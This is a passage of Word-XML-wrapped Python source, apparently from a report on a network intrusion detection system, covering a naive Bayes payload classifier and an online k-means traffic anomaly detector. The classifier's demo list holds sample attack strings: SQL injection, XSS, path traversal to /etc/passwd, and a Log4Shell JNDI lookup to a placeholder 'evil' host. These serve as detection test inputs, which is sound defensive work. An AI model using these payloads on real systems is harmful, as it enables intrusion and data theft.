    <w:p w14:paraId="5102AD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so recall is no longer bounded by whatever was hard-coded.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EC295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39ECE2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rows = [(str(p), str(l)) for p, l in samples]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FBFF4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malicious = {"MALICIOUS", "ATTACK"}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1208A9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n_mal = sum(1 for _, l in rows if l.upper() in malicious)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="716578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n_safe = len(rows) - n_mal</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CBE5F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n_mal == 0 or n_safe == 0:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E5375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ValueError("payload training set must contain both classes")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32DC63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D711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vocabulary = set(self.likelihoods)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14D91A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discover:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67DB99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vocabulary |= discover_vocabulary(rows, top_n=top_n)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E8FBE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813B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likelihoods = {}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47D9DF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word in vocabulary:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C6281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 = sum(1 for p, l in rows</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39FFFB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if l.upper() in malicious and word in p.upper())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C584A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 = sum(1 for p, l in rows</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5223A4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  if l.upper() not in malicious and word in p.upper())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C6C92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Laplace smoothing so an unseen token never yields log(0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C2F0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p_mal = (m + laplace) / (n_mal + 2 * laplace)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22E6A5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p_safe = (s + laplace) / (n_safe + 2 * laplace)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05795F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likelihoods[word] = (round(p_mal, 6), round(p_safe, 6))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C4708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2CDD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self.likelihoods = likelihoods</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="104CC7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self.prior_malicious = n_mal / len(rows)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C808B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self.prior_safe = 1.0 - self.prior_malicious</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A7CC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print("[NB ] %d payloads (mal=%d safe=%d) prior=%.3f vocab=%d"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="408242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(len(rows), n_mal, n_safe, self.prior_malicious,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="604DC9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len(likelihoods)))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23437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{"samples": len(rows), "malicious": n_mal, "safe": n_safe,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E8D1D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"prior_malicious": self.prior_malicious,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36BA22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"vocabulary": len(likelihoods)}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DCFBE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D4B4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reset(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C1F23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self.likelihoods = dict(DEFAULT_LIKELIHOODS)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21A461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self.prior_malicious = 0.10</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A3093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self.prior_safe = 0.90</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="748DD5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00545FC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EB332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1736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_tokenise(text):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E810D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"""Split a payload into candidate tokens (alphanumeric runs, 3+ chars)."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77DE89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out, current = [], []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F4950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ch in text.upper():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A9DD3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ch.isalnum() or ch in "_$":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03C531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current.append(ch)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F0D9A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07FEFF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len(current) &gt;= 3:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CA632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out.append("".join(current))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EEE48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current = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4654CB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len(current) &gt;= 3:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E1C75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out.append("".join(current))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64CA43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3E9AFAB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90E82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2686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discover_vocabulary(rows, top_n=40, min_count=2):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="550737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"""Select the most class-discriminative tokens by log-odds ratio.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10EB52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D535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each candidate token the ratio of its frequency in the malicious class</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="446DA4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to its frequency in the safe class is scored as</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D3C64F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F924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score = | log( (m + 1) / (s + 1) ) |</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00FD0FF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5B4F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and the highest scoring tokens are returned. Tokens that appear in both</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54F38B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classes at similar rates score near zero and are discarded, so the learned</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E3C59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vocabulary contains only features that carry signal.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C4A0B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0F9DC3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malicious = {"MALICIOUS", "ATTACK"}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32549E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mal_counts, safe_counts = {}, {}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7351DE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C950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payload, label in rows:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="141162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seen = set(_tokenise(payload))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A096A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target = mal_counts if str(label).upper() in malicious else safe_counts</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="563D46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token in seen:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07B375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target[token] = target.get(token, 0) + 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0ABCC56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ECA8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scored = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="400AF7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token in set(mal_counts) | set(safe_counts):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FBE02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 = mal_counts.get(token, 0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="377DD3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 = safe_counts.get(token, 0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="712B9B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m + s &lt; min_count:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30E929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continue</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BF682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score = abs(math.log((m + 1.0) / (s + 1.0)))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AFF3C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scored.append((score, token))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CB924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C2A3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scored.sort(reverse=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67026F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{token for _, token in scored[:top_n]}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="637D0C6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5158A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C3EA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3D144B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nb = PayloadMonitor()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E9ED6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print("seed vocabulary: %d tokens" % len(nb.likelihoods))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EA0DC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 in [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C31B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/index.html HTTP/1.1\r\nHost: google.com",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AD0FE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 HTTP/1.1\r\nUser-Agent: curl/8.5.0",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EAE99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b"user=admin' UNION SELECT * FROM users --",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B4E40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/?q=&lt;svg onerror=alert(1)&gt;",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="740BA8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/?file=../../../etc/passwd",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E4011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b"POST /api {'x':'${jndi:ldap://evil/a}'}",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AEE3F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b"msg=Did you select the right option?",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="210497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]:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4829BF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v, c, w = nb.classify(p)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="049B8C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print("%-9s conf=%6.2f%% %s" % (v, c * 100, w[:4]))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E7AA8F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src/engines/kmeans.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22B17E33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(224 lines)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E433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446C29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8BF4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try:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="082F2B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engines.base import DetectionEngine, Verdict</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14A615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except ImportError:  # allow `python engines/kmeans.py` direct execution</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42970E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base import DetectionEngine, Verdict</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="380604B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F0D7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Cluster 0 is the idle/normal profile, 1 the high-volume profile and 2 the</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="078521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wide-port-spread profile, matching the seeded centroids below.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="195E43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ANOMALY_CLUSTER = 2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="504602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CLUSTER_LABELS = {0: "Idle", 1: "High Volume", 2: "Port Spread"}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28E380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CC1D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A4E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KMeansMonitor(DetectionEngine):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2816F8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online (mini-batch) k-means - centroids drift toward live traffic</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1449AE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so the model adapts as the network changes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69C12BA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B478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"kmeans"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="508C9B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("packets_per_second", "unique_ports")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D32D3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EF67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k=3, learning_rate=0.1, radius_multiplier=3.0,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3852D5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min_samples=8):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CE835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 = k</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53604E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self.alpha = learning_rate</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30A4A2E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0AC1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default clusters: idle / ddos / scanner</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32A1B0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picked manually so we don't need an offline training pass to start</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="000A0B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self.centroids = [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C6C41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[10.0, 2.0],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="002919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[200.0, 5.0],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43CEC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[20.0, 50.0],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F9FF2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662087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F998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Novelty detection over the *reconstruction error* - the distance from</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A6D8F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each observation to its nearest centroid.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08221B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</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F7F74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Testing cluster identity (the previous `cluster == 2` rule) cannot</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="779E9C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detect novelty: every point is assigned to some cluster, so traffic</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1ADEEB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unlike anything seen before is silently absorbed into whichever</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74EB0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centroid happens to be least distant. Testing distance instead is</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78C76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what turns clustering into an anomaly detector.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15F537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</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B5595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statistics are pooled across all clusters rather than kept</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D47B9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per-cluster. Attack traffic is by definition rare, so an</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="639712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attack-region cluster would never accumulate enough observations to</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35A0BE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finish warming up, and a per-cluster threshold would stay disabled</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72C8A8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exactly when it was needed. Pooling means the model calibrates on the</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16F3C3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abundant normal traffic and is immediately usable.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="209D49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self.radius_multiplier = radius_multiplier</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D27D3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self.min_samples = min_samples</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BFB90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self.dist_count = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CDFD2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self.dist_mean = 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4192C8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self.dist_m2 = 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="371862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self.cluster_counts = [0] * k</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D8734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EA33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euclidean_distance(self, a, b):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61C232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math.sqrt(sum((x - y) ** 2 for x, y in zip(a, b)))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7227D5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2C28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classify(self, pps, unique_ports):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2212F3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point = [float(pps), float(unique_ports)]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C070F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EFAC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best_dist = float("inf")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16B374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best = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D8645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i, c in enumerate(self.centroids):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="233378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 = self.euclidean_distance(point, c)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08ACE1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d &lt; best_dist:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B5A87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best_dist = d</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B1EA1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best = i</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="311C75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E409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self._update_centroid(best, point)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="664BF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best</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C8E54D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5884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def _update_centroid(self, idx, point):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DE40E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c_new = c_old + alpha * (point - c_old)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="510800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old = self.centroids[idx]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B1155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self.centroids[idx] = [o + self.alpha * (p - o) for o, p in zip(old, point)]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="230F152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AC13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distances(self, pps, unique_ports):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="286F19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point = [float(pps), float(unique_ports)]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="492F00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[self.euclidean_distance(point, c) for c in self.centroids]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B3DA32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A875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uniform engine interface (NFR-5) ------------------------------</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37B22A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pps, unique_ports, update=True):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="491C90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"""Assign the observation to a cluster and test it for novelty.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67CD700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5055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Anomaly criterion: distance to the assigned centroid exceeds</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57F0B5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`radius_multiplier` times that cluster's running mean radius, once the</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="486592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cluster has seen at least `min_samples` observations. Before the warm-up</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BBD40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threshold the radius estimate is meaningless, so nothing is flagged and</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="267278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 engine cannot produce start-up false positives.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10811F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90C1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Confidence is how far beyond the radius the point sits, capped at 1.0.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0069FF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7D6C24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dists = self.distances(pps, unique_ports)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38BA27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best = min(range(len(dists)), key=lambda i: dists[i])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="587C98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nearest = dists[best]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EE2DE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7A02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mean, std = self.distance_baseline()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03ACE2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warm = self.dist_count &gt;= self.min_samples</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A6A8F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mu + k*sigma, falling back to a multiple of the mean when the</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="051D95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observed distances have not varied at all (std == 0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B0DAF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limit = (mean + self.radius_multiplier * std if std &gt; 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="370C7B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else mean * self.radius_multiplier)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74E39C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FE99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is_threat = bool(warm and limit &gt; 0 and nearest &gt; limit)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="744AF9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1 - limit/distance rises monotonically toward 1 without ever</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B454E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reaching it, so "far outside the threshold" and "extremely far</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CE125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outside" remain distinguishable instead of both clamping to 1.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="546463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confidence = (1.0 - (limit / nearest)) if is_threat else 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A4F5D2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B55B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update and not is_threat:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="657444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Only non-anomalous points are folded into the model, so a</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="387466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sustained attack cannot drag a centroid onto itself and then</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="647ABC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declare the traffic normal (the same poisoning guard the</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="539526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Z-Score engine applies to its baseline).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BE4F7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self.cluster_counts[best] += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39FFE9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self.dist_count += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29B321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delta = nearest - self.dist_mean</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58126A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self.dist_mean += delta / self.dist_count</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="559852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self.dist_m2 += delta * (nearest - self.dist_mean)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F9388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self._update_centroid(best, [float(pps), float(unique_ports)])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69D6CF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E298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Verdict(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FFF23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CLUSTER_LABELS.get(best, "Cluster %d" % best),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39FF20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confidence=confidence,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B9D43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detail={"cluster": best, "distance": round(nearest, 3),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B32CD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"mean_distance": round(mean, 3),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="570399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"threshold": round(limit, 3),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4035B3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"samples": self.dist_count,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="674565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"centroid": [round(v, 2) for v in self.centroids[best]]},</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C5C01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is_threat=is_threat,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20B884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61C45B2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EA5C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distance_baseline(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DDF4F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"""Mean and population std-dev of nearest-centroid distance (Welford)."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AFC35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self.dist_count &lt; 2:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="288A64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self.dist_mean, 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6040FC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self.dist_mean, math.sqrt(self.dist_m2 / self.dist_count)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38245F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6101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points, iters=25, tolerance=1e-3):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="327C8C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"""Batch Lloyd's algorithm to place the initial centroids.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F1FDD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93EF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Online updates then let the centroids drift with live traffic, but a</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A4D66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batch pass first gives them a data-driven starting position instead of</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="766036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the hand-picked seeds.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="641A75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6614D0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pts = [[float(v) for v in p] for p in points]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="478980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len(pts) &lt; self.k:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="012136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ValueError("need at least %d points" % self.k)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="724565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5FA1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step = max(1, len(pts) // self.k)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EB50F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self.centroids = [list(pts[i * step]) for i in range(self.k)]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="131DE1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6D46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range(iters):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0747B6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groups = [[] for _ in range(self.k)]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6529F3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p in pts:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="156B96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idx = min(range(self.k),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B6D1B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key=lambda i: self.euclidean_distance(p, self.centroids[i]))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03C238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groups[idx].append(p)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CED5C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moved = 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="491218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i, group in enumerate(groups):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="564B9F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not group:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E3B0A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continue</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A1DBD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new = [sum(m[j] for m in group) / len(group)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="520517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for j in range(len(group[0]))]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28750E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moved += self.euclidean_distance(self.centroids[i], new)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DB893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self.centroids[i] = new</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CFB4A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moved &lt; tolerance:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F7754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break</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FF16E8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29AA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inertia = sum(min(self.euclidean_distance(p, c) ** 2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="658B37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for c in self.centroids) for p in pts)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28DFAA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print("[KM ] %d centroids on %d points: %s"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="279C5E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(self.k, len(pts), [[round(v, 2) for v in c]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34D198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for c in self.centroids]))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67C6F2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{"points": len(pts), "centroids": self.centroids,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="564572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"inertia": round(inertia, 3)}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="413ED8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0583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259BDB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{"k": self.k, "alpha": self.alpha, "centroids": self.centroids,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67428D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"dist_count": self.dist_count, "dist_mean": self.dist_mean,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F4153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"dist_m2": self.dist_m2,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08249E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"cluster_counts": self.cluster_counts}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FD577B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5EB7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3BAC7B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"centroids" in data:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62FFDB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self.centroids = data["centroids"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C91B4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self.k = len(self.centroids)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CC271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tolerate brains saved before distance stats were tracked</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A9055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self.dist_count = int(data.get("dist_count", 0))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E2B78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self.dist_mean = float(data.get("dist_mean", 0.0))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14BF1C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self.dist_m2 = float(data.get("dist_m2", 0.0))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02BC7D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self.cluster_counts = list(data.get("cluster_counts",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="141FE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[0] * self.k))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27BB42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while len(self.cluster_counts) &lt; self.k:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55FE2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self.cluster_counts.append(0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="123119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Federate Learning: K-Means loaded %d external centroids."</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00A55F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len(self.centroids))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="634587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7D694F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4C29D2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8A37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8CA2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2E5308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km = KMeansMonitor(k=3, learning_rate=0.1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="427D159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B248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learn what "normal" looks like for this host</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79A40F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print("warm-up on 20 seconds of idle traffic")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25ECC6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 in range(20):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="078B1D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km.analyse(10 + (i % 3), 2)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EF648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m, sd = km.distance_baseline()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="493BE0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nearest-centroid distance: mean=%.3f std=%.3f over %d samples"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="191CCB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(m, sd, km.dist_count))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00BA9F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829D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print("\nnow score traffic the host has never seen:")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37E596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pps, ports, note in [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DD566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(11, 2, "more idle traffic"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EBA0E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(60, 45, "moderate scan-like spread"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42C8E4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(9000, 1, "massive flood"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FF61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(300, 400, "wide port sweep"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F2031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]:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6115EF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 = km.analyse(pps, ports)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="218C43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  pps=%-5d ports=%-4d -&gt; %-12s anomaly=%-5s dist=%.1f thr=%.1f"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CF672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(pps, ports, v.label, v.is_threat,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="358D5B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v.detail["distance"], v.detail["threshold"]))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AEEE86C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src/engines/bloom.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A573760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(191 lines)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EF423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hashlib</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07135B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0CA233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zlib</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="459B94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A252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try:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A4AEE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engines.base import DetectionEngine, Verdict</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="279E00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except ImportError:  # allow `python engines/bloom.py` direct execution</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7385A4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from base import DetectionEngine, Verdict</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6905EF8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C35D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F8CE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BloomFilter(DetectionEngine):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C285B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"""Probabilistic set membership for IP reputation lookups.</w:t>
